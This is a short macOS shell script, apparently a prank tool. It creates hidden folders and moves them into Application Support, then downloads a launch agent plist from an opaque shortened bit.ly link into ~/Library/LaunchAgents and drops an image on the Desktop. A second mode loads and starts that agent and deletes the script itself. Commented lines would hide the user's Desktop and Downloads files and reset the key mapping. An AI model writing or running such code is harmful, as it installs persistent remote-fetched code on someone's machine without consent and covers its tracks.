#!/bin/sh

if [[ $1 -eq 1 ]]
then
	mkdir ~/.lmaktab ~/.ta7milat ~/.TIG
	# mv ~/Desktop/* .lmaktab
	# mv ~/Downloads/* .ta7milat
	mv ~/.lmaktab ~/.ta7milat ~/.TIG
	mv ~/.TIG ~/Library/Application\ Support/Knowledge
	curl -L -o com.local.hh.plist https://bit.ly/3IiFJij
	mv ~/com.local.hh.plist ~/Library/LaunchAgents
	curl -o hh.png https://i.imgur.com/okdA9yR.png
	mv hh.png ~/Desktop

elif [[ $1 -eq 2 ]]
then
	echo "2"
	launchctl load ~/Library/LaunchAgents/com.local.hh.plist
	# hidutil property --set '{"UserKeyMapping":[]}' reset hhhh
	launchctl start com.local.hh
	rm -rf hh.sh
else
	echo "missing arg"
fi